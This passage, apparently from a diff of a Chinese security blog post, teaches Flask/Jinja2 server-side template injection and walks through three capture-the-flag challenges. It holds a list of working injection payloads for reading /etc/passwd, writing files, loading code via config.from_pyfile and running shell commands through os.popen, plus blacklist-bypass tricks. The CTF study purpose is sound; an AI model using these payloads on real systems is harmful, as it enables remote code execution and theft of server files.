+<span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">189</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__imp'</span><span class="token operator">+</span><span class="token string">'ort__'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'pop'</span><span class="token operator">+</span><span class="token string">'en'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'ls /'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p><strong>可以通过dir(object)列出python 3.6 版本下的object类下的方法集合。这里要记住一点2.7和3.6版本返回的子类不是一样的，但是2.7有的3.6大部分都有。需要自己寻找合适的标号来调用。POC的编写就是需要找到合适的类，然后从合适的类中寻找我们需要的方法</strong></p>
+<pre class=" language-python"><code class="language-python"><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true"># 返回了&lt;class 'str'>，对于一个空字符串他已经打印了str类型</span>
+<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true"># 打印返回(&lt;class 'object'>,)，我们已经找到了他的基类object，而我们想要寻找object类的不仅仅只有bases，同样可以使用mro，mro给出了method resolution order，即解析方法调用的顺序</span>
+<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true"># 返回了(&lt;class 'str'>, &lt;class 'object'>)，同样可以找到object类</span>
+<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true"># 这个方法返回的是这个类的子类的集合，也就是object类的子类的集合。</span>
+
+<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">118</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true"># 接下来就是我们需要找到合适的类，然后从合适的类中寻找我们需要的方法。这里开始我们不再用pycharm打印了，直接利用上面我们已经搭建好的漏洞环境来进行测试。通过我们在如上这么多类中一个一个查找，找到我们可利用的类，这里举例一种。&lt;class 'os._wrap_close'>，os命令相信你看到就感觉很亲切。我们正是要从这个类中寻找我们可利用的方法，通过大概猜测找到是第119个类，0也对应一个类，所以这里写[118]</span>
+<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">118</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true"># 会有一些类显示&lt;slot wrapper ‘__init__‘ of ‘xxxx‘ objects> wrapper是指这些函数并没有被重载，这时他们并不是function，不具有__globals__属性，也就是不能利用</span>
+
+<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">118</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true"># 可以利用.init.globals来找os类下的，init初始化类，然后globals全局来查找所有的方法及变量及参数。</span>
+<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">118</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'dir'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true"># 看到各种各样的参数方法函数。我们找其中一个可利用的function popen，在python2中可找file读取文件，很多可利用方法，详情可百度了解下</span></code></pre>
+<p><strong>基本思路：</strong>获取基本类-&gt;获取基本类的子类-&gt;在子类中找到关于命令执行和文件读写的模块</p>
+<h2 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h2><pre class=" language-python"><code class="language-python">python3
+<span class="token operator">-</span> 文件读取：<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;&amp;#123;().__class__.__bases__[0].__subclasses__()[177].__init__.__globals__.__builtins__['open']('1.py').read()&amp;#125;&amp;#125;</span>
+<span class="token operator">-</span> 命令执行：<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;&amp;#123; config.__class__.__init__.__globals__['os'].popen('ls').read() &amp;#125;&amp;#125;</span>
+
+python2
+<span class="token operator">-</span> 文件读取：<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;&amp;#123;''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()&amp;#125;&amp;#125;</span>
+<span class="token operator">-</span> 文件读取：<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>\_\_class__<span class="token punctuation">.</span>\_\_bases\_\_<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>\_\_subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines
+<span class="token operator">-</span> 文件读取：<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;&amp;#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()&amp;#125;&amp;#125;  </span>
+<span class="token operator">-</span> 写文件：<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;&amp;#123; ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/1').write("") &amp;#125;&amp;#125;</span>
+<span class="token operator">-</span> 命令执行：<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;&amp;#123;''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()"</span>
+<span class="token operator">-</span> 命令执行：<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;&amp;#123;''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg','w').write('code')&amp;#125;&amp;#125;  </span>
+<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;&amp;#123; config.from_pyfile('/tmp/owned.cfg') &amp;#125;&amp;#125; </span></code></pre>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="SSTI之NORMAL-SSTI-二向箔安全"><a href="#SSTI之NORMAL-SSTI-二向箔安全" class="headerlink" title="SSTI之NORMAL SSTI(二向箔安全)"></a>SSTI之NORMAL SSTI(二向箔安全)</h3><p>页面显示一个<code>hello guest</code>，在后面加上name参数看会不会返回输入的值</p>
+<p><img src="https://i.loli.net/2020/09/07/cH2dsT8vhtRFg7o.png" alt="1.png"></p>
+<p>把123改成具有运算的参数，两个数相乘看一下</p>
+<p><img src="https://i.loli.net/2020/09/07/CDZmL7PY5VUnO9j.png" alt="2.png"></p>
+<p>这就是典型的模板注入的场景，那么我们模板注入首先对于python web模板注入来说是基于类来实现各个操作的.可以打一下当前类的名字，可以用burpsuite抓包看一下，会更明显，我们输入</p>
+<p><img src="https://i.loli.net/2020/09/07/4LMqQFKUoWZJNbR.png" alt="4.png"></p>
+<p>像前面说的object是所有类的父类，所以要找到它</p>
+<p><img src="https://i.loli.net/2020/09/07/9W2fem1RukrEMxP.png" alt="5.png"></p>
+<p>然后再找到object类下面的子类</p>
+<p><img src="https://i.loli.net/2020/09/07/RLPDUhJNuw4QMq8.png" alt="6.png"></p>
+<p>可以看到object存在很多类。但我们想要执行命令读取系统本地文件，我们要想办法逃逸沙盒。我们得选择一个能帮助我们逃逸得类,我们一般会选择OS._wrap_close，还有一些比如：os下面的popen,<code>linecache类</code>和<code>__import__类</code>(python２不行)都有os，__builtins__类里有<code>eval、__import__</code>等函数，可以利用此来执行命令<br>我们通常用这个类帮助我们逃逸，为什么呢？因为这个类里面有个popen方法，通过popen执行系统命令，通过这个管道把它输出到标准输出里面.我们看看这个类存不存在。</p>
+<p><img src="https://i.loli.net/2020/09/07/oqgHBCPM4L516Nl.png" alt="7.png"></p>
+<p>利用.init.globals来找os类下的所有的方法及变量及参数</p>
+<p><img src="https://i.loli.net/2020/09/07/Gp1Hf6sEnb3vTPa.png" alt="8.png"></p>
+<p>找到popen然后查看flag</p>
+<p><img src="https://i.loli.net/2020/09/07/rShDPq1K9gMFpjT.png" alt="9.png"></p>
+<pre class=" language-python"><code class="language-python">payload：`<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;&amp;#123;''.__class__.__mro__[1].__subclasses__()[117].__init__.__globals__['popen']('cat+/flag').read()&amp;#125;&amp;#125;`</span></code></pre>
+<h3 id="SSTI题目之护网杯2019-SSTI-二向箔安全"><a href="#SSTI题目之护网杯2019-SSTI-二向箔安全" class="headerlink" title="SSTI题目之护网杯2019 SSTI(二向箔安全)"></a>SSTI题目之护网杯2019 SSTI(二向箔安全)</h3><p>因为这题没有给环境，所以没办法复现，但是给了wp，还是想把wp拿过来总结一下</p>
+<p><code>题目得源码</code></p>
+<p><img src="https://i.loli.net/2020/09/07/yuoDO4FHw6rU7g8.png" alt="10.png"></p>
+<p>引入了flask这个模板，然后引入了两个路由,一个是根路径一个是render支持post和get方法,在render里面它定义了一个方法叫convert()</p>
+<p><img src="https://i.loli.net/2020/09/07/HDmfR9k4ST6ghIo.png" alt="11.png"></p>
+<p>它获取了传入的参数data,然后对传入得数据进行过滤，如果是黑名单里得关键词就会返回400.这些黑名单里都是ssti常用的payload的字符</p>
+<p><img src="https://i.loli.net/2020/09/07/qRegfts6KQWwIOF.png" alt="12.png"></p>
+<p>要获取基类得时候。我们一般通过[].__class__不过这个在黑名单里面，我们是不能使用。我们还不能用中括号来获取下标的一个类,比如上一个题我们是用subclassese()[1]来获取一个子类比如获取OS.__wrap,当务之急是解决下划线的问题,就是我们调用不到所有的魔术方法,这一点我们就引入了flask动态传参的问题,我们这里是用的request.args.get(‘data’),支持自定义一个request.args.hget,我们把这个作为一个变量,同时写一个动态传参:request.args.param&amp;param=123实现动态传参,具体怎么弄,我们先来看一下题目</p>
+<p><img src="https://i.loli.net/2020/09/07/aGXmYPxO6lMk4HE.png" alt="13.png"></p>
+<p>它回显了123.就是刚才经典的漏洞场景,传入的参数回显到页面,前面说到的动态传参,我们具体看看手册,应该怎么使用,这里就涉及到了attr,一个过滤器.他支持一个获取对象的属性,而且给了一个实例.</p>
+<p><img src="https://i.loli.net/2020/09/07/4se7gGrofJMkWzb.png" alt="14.png"></p>
+<p>我们可以通过attr替代黑名单里面得中括号,当然通过attr也可以替代点号的用法</p>
+<p><img src="https://i.loli.net/2020/09/07/T6a8JkEoKzrNI29.png" alt="14.png"></p>
+<p>首先我们确定他是一个ssti,因为它过滤了中括号,那我们就用字符来获取一个基类</p>
+<p><img src="https://i.loli.net/2020/09/07/YkfLU1z72JMiPTj.png" alt="15.png"></p>
+<p>我们获取到了双引号的类名，payload的其中的param1是自由定义的名字可以换成其他的。</p>
+<p><img src="https://i.loli.net/2020/09/07/qcZyoPnzkbiBaCW.png" alt="16.png"></p>
+<p>获取到了双引号的类名是string类型,接着我们按照攻击链的思路去获取他的基类。</p>
+<p><img src="https://i.loli.net/2020/09/07/qyTJizsCmpURwej.png" alt="17.png"></p>
+<p>我们获取到了object的所以子类，接着我们去调用一个对我们有用的子类就行。这里涉及到了一个新的魔术方法就是<code>__getitem__</code></p>
+<p><img src="https://i.loli.net/2020/09/07/s3jd5cu9mkrI2hz.png" alt="18.png"></p>
+<p>我们依旧是通过burpsuite进行FUZZ,wrap在第几个下标里.</p>
+<p><img src="https://i.loli.net/2020/09/07/Ds6OS8YFcr3W2Jg.png" alt="19.png"></p>
+<p><img src="https://i.loli.net/2020/09/07/u3ps7eikERo2KWg.png" alt="20.png"></p>
+<p>我们可以看见是127,我们成功获取到了os.wrap.close</p>
+<p><img src="https://i.loli.net/2020/09/07/lB9FtjUrHG1X7q2.png" alt="21.png"></p>
+<p>接着我们获取到了他全部的方法</p>
+<p><img src="https://i.loli.net/2020/09/07/7hWVIlGH5LPfd3x.png" alt="22.png"></p>
+<p>接下来就是常规的调用popen方法，接着我们执行一个‘whoami’</p>
+<p><img src="https://i.loli.net/2020/09/07/nTxw4sEmLvKRzrV.png" alt="23.png"></p>
+<p><img src="https://i.loli.net/2020/09/07/UcOuPKybRgsH8ZA.png" alt="24.png"></p>
+<p>通过动态参数和__getitem__来绕过了属性的选择和过滤.这道题也是一道比较难的bypass类型题目</p>
+<h3 id="SSTI题目之SCAM"><a href="#SSTI题目之SCAM" class="headerlink" title="SSTI题目之SCAM"></a>SSTI题目之SCAM</h3><p>这道题虽然没有进行任何过滤，但web应用的点都是很常见的，比如我们不知道在真实的环境中是否存在SSTI，所以要寻找SSTI的点</p>
+<p><img src="https://i.loli.net/2020/09/08/kbGzmdEV1htyu2f.png" alt="25.png"></p>
+<p>类似于一个骗子的系统，要骗一个人的话,我们可以添加子段和被害人的属性值</p>
+<p><img src="https://i.loli.net/2020/09/08/aoqG9h1tdySpN6J.png" alt="28.png"></p>
+<p><img src="https://i.loli.net/2020/09/08/9Y7PUTcMO4mqDk8.png" alt="37.png"></p>
+<p><img src="https://i.loli.net/2020/09/08/Nue2TFCIgSvhGcf.png" alt="26.png"></p>
+<p>添加一个受害人然后抓个包看一下</p>
+<p><img src="https://i.loli.net/2020/09/08/LQoSvBiMIFbK3dp.png" alt="29.png"></p>
+<p>它的数据包是这种形式是firstname，surname，full_name，逻辑很清晰首先它对 victim进行录入，然后victim的firstname作为hello firstname字段，然后victim的welcome </p>
+<p>然后在firstname做一个SSTI的测试</p>
+<p><img src="https://i.loli.net/2020/09/08/QNhzSW6jiADxJX3.png" alt="30.png"></p>
+<p><img src="https://i.loli.net/2020/09/08/4yKDdSt9E1CAUqx.png" alt="31.png"></p>
+<p>发现加号被吃掉因为没有url编码，但也同时发现没有报错信息所以是没有ssti注入的，这时候我们就要思考了他不是在这里进行渲染那有可能就是在type里面进行模板 渲染,所以我们测试一下type点</p>
+<p><img src="https://i.loli.net/2020/09/08/JI8Eo7gCN6XbMwW.png" alt="32.png"></p>
+<p>我们可以通过调用to_dict,去看看victim是什么,victim本身也有firstname的属性的</p>
+<p><img src="https://i.loli.net/2020/09/08/ZDTGk8atSh6qUQj.png" alt="34.png"></p>
+<p><img src="https://i.loli.net/2020/09/08/cRsXJ1gVxZN25Ke.png" alt="33.png"></p>
+<p>用__globals__去查看，看到我们获取了系统的环境变量，我们看看会不会直接存在flag</p>
+<p><img src="https://i.loli.net/2020/09/08/EQZXVwgiHW92uNI.png" alt="35.png"></p>
+<p>可以找到flag</p>
+<p><img src="https://i.loli.net/2020/09/08/wgpZUK4kERJQbMa.png" alt="36.png"></p>
+<p>参考链接：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hackxf/p/10480071.html">https://www.cnblogs.com/hackxf/p/10480071.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3679#toc-12">https://xz.aliyun.com/t/3679#toc-12</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/a1d6ae580add">https://www.jianshu.com/p/a1d6ae580add</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/56614e46093e">https://www.jianshu.com/p/56614e46093e</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/197602">https://www.anquanke.com/post/id/197602</a></p>
+<p><a target="_blank" rel="noopener" href="https://twosecurity.cn/">https://twosecurity.cn/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/188172">https://www.anquanke.com/post/id/188172</a></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">PlayZG</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://example.com/2021/01/24/FLASK%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-SSTI-%E5%AD%A6%E4%B9%A0/">http://example.com/2021/01/24/FLASK%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-SSTI-%E5%AD%A6%E4%B9%A0/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">PlayZG</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/FLASK%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-SSTI-%E5%AD%A6%E4%B9%A0/">
+                                    <span class="chip bg-color">FLASK模板注入(SSTI)学习</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2021/01/24/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="redis安全学习">
+                        
+                        <span class="card-title">redis安全学习</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-01-24
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            PlayZG
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/redis/">
+                        <span class="chip bg-color">redis</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/01/24/SSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="SSRF漏洞学习">
+                        
+                        <span class="card-title">SSRF漏洞学习</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-01-24
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            PlayZG
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/SSRF/">
+                        <span class="chip bg-color">SSRF</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: Hexo<br />'
+            + '文章作者: John Doe<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
